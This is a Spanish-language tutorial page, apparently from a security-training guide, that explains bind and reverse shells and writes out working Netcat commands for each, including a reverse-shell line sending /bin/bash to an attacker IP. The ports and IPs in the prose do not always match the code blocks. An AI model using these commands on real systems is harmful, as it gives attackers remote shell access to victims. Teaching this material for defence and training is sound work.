# Invertir y vincular shells(Reverser/Bind Shells)

Un _shell_ es una utilidad que actúa como interfaz entre un usuario y el sistema operativo.&#x20;

En Linux existen varios entornos de shell, como Bash, ksh y tcsh.En Windows el shell es el símbolo del sistema , que se invoca mediante cmd.exe.

Windows PowerShell es un shell de Microsoft más nuevo que combina la antigua funcionalidad CMD con un nuevo conjunto de instrucciones de scripting/cmdlet con funcionalidad de administración del sistema integrada. Los cmdlets de PowerShell permiten a los usuarios y administradores automatizar tareas complicadas con scripts reutilizables.

Con un shell de enlace, un atacante abre un puerto o un escucha en el sistema comprometido y espera una conexión. Esto se hace para conectarse a la víctima desde cualquier sistema y ejecutar comandos y manipular aún más a la víctima.&#x20;

<img src="../../../.gitbook/assets/file.excalidraw (5).svg" alt="" class="gitbook-drawing">

Un shell inverso es una vulnerabilidad en la que un sistema atacante tiene un oyente (puerto abierto y la víctima inicia una conexión con el sistema atacante.

<img src="../../../.gitbook/assets/file.excalidraw (9).svg" alt="" class="gitbook-drawing">

### Netcat

Un atacante podría usar el comando **`nc -lvp 1234 -e /bin/bash`** en el sistema comprometido (192.168.78.6) para crear un escucha en el puerto **`1234`** y ejecutar ( **-e** ) el shell Bash ( **/bin/bash** ).

#### &#x43;_&#x72;eación de un shell de enlace utilizando Netcat._

```
nc -lvp 1234 -e /bin/bash
```

> Windows **nc -lvp 1234 -e cmd.exe** Netcat.

En el sistema atacante (192.168.78.147), se utiliza el comando nc -nv 192.168.78.6 1234 para conectarse con la víctim&#x61;**.** Una vez que el atacante (192.168.78.147) se conecta con la víctima (192.168.78.6), se invoca el comando **ls** y se muestran tres archivos en la pantalla del atacante.

#### _Conexión al Bind Shell mediante Netcat_

```
nc -nv 192.168.60.8 1234
```

#### _Un atacante conectado a una víctima mediante un Bind Shell_

```
nc -lvp 1234 -e /bin/bash
```

Uno de los desafíos de usar shells de enlace es que si el sistema de la víctima está detrás de un firewall, el puerto de escucha podría estar bloqueado. Sin embargo, si el sistema de la víctima puede iniciar una conexión con el sistema atacante en un puerto determinado, se puede utilizar un shell inverso para superar este desafío.

Para crear un shell inverso, puede usar el comando **nc -lvp 666** en el sistema atacante para escuchar un puerto específico.

#### _Creación de un oyente en el sistema atacante para crear un shell inverso usando Netcat_

```
nc -lvp 4000
```

Luego, en el host comprometido, puede usar el comando **nc 192.168.78.147 666 -e /bin/bash** para conectarse al sistema atacante.

_Conexión al sistema atacante (Shell inverso) mediante Netcat_

```
nc 192.168.78.147 4000 -e /bin/bash
```

Una vez que el sistema víctima (192.168.78.6) esté conectado al sistema atacante (192.168.78.147), puede comenzar a invocar comandos.

